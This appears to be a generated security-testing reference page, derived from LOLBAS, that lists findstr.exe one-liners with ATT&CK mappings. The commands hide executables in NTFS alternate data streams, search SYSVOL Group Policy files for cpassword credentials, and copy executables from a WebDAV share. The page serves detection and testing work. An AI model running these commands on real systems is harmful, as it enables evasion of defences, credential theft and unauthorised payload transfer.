---
parsed_by: focuslocust
source: commands
type: generated
---
# Findstr Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Findstr.exe

Tool page: [Findstr.exe](../../tools/windows/findstr.exe.md)

### Add a file to an alternate data stream to hide from defensive counter measures

```text
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
```

Description:

Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Findstr.yml` |
| Evidence | Command preserved from source parser. |

### Add a file to an alternate data stream from a webdav server to hide from defensive counter measures

```text
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
```

Description:

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Findstr.yml` |
| Evidence | Command preserved from source parser. |

### Find credentials stored in cpassword attrbute

```text
findstr /S /I cpassword \\sysvol\policies\*.xml
```

Description:

Search for stored password in Group Policy files stored on SYSVOL.

Related ATT&CK:

- [T1552.001](../../attack/techniques/T1552.001-credentials-in-files.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Findstr.yml` |
| Evidence | Command preserved from source parser. |

### Download/Copy file from webdav server

```text
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
```

Description:

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Findstr.yml` |
| Evidence | Command preserved from source parser. |
